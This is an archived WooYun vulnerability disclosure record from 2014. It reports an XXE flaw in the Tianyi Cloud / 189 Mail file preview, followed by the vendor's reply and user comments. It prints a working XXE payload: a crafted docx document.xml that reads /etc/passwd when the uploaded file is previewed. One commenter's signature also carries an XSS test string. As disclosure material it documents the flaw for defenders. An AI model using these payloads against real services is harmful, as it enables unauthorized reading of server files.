{"id": 156, "wybug_id": "wooyun-2014-077146", "wybug_title": "天翼云一处xxe漏洞可读取任意文件", "wybug_corp": "189邮箱业务支撑中心", "wybug_author": "Rona", "wybug_date": "2014-09-24 11:36", "wybug_open_date": "2014-11-08 11:38", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向公众公开  简要描述： 天翼云一处xxe漏洞 详细说明：  解压缩docx文件，修改word/document.xml189邮箱的文件预览页存在该问题。\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><w:document xmlns:ve=\"http://schemas.openxmlformats.org/markup-compatibility/2006\" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\" xmlns:m=\"http://schemas.openxmlformats.org/officeDocument/2006/math\" xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:wp=\"http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\" xmlns:wne=\"http://schemas.microsoft.com/office/word/2006/wordml\"><w:body><w:p w:rsidR=\"00864BB8\" w:rsidRDefault=\"00630334\"><w:r><w:t>test &xxe;</w:t></w:r></w:p><w:sectPr w:rsidR=\"00864BB8\" w:rsidSect=\"00864BB8\"><w:pgSz w:w=\"11906\" w:h=\"16838\"/><w:pgMar w:top=\"1440\" w:right=\"1440\" w:bottom=\"1440\" w:left=\"1440\" w:header=\"708\" w:footer=\"708\" w:gutter=\"0\"/><w:cols w:space=\"708\"/><w:docGrid w:linePitch=\"360\"/></w:sectPr></w:body></w:document>\n上传到文件云，预览触发。   漏洞证明：  \n\n   修复方案：  处理解析   版权声明：转载请注明来源 Rona@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-24 17:57 厂商回复： 谢谢！已安排修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-24 13:47 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  这个竟然没人关注？    \n     2014-09-24 15:10 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  xxe都没接触过呀    \n     2014-11-08 14:00 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  顶个，xxe，必关注    \n     2014-11-08 15:48 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n   XXE  .......     农村户口第一次听说!  求公布    \n     2014-11-08 23:24 |    \t\t蚊子 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  前段日子看了fb那篇文章才知道啥是xxe    \n     2015-05-15 13:30 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:61        | 天涯何处无屌丝)\t\t \n  @Rona 意思就是上传一个存在问题的word文件，进行自解压最后触发xxe？    \n     2015-05-16 14:47 |    \t\tRona \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:23        | test)\t\t \n  @糖剩七颗 修改doc文件为.zip可以解压的。    \n     2015-05-16 17:25 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:61        | 天涯何处无屌丝)\t\t \n  @Rona 洞主方便私信个qq吗？有问题请教    \n     2015-05-16 17:35 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:61        | 天涯何处无屌丝)\t\t \n  @Rona 意思就是把doc的文件写上出发xxe的恶意代码，然后改为.zip最后上传预览就可以触发xxe？    \n     2015-05-18 13:51 |    \t\tRona \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:23        | test)\t\t \n  @糖剩七颗 修改1.doc 为1.zip     \n     2015-07-30 14:21 |    \t\tsOnsec \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:24        | 安全是什么...)\t\t \n  又是XEE。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}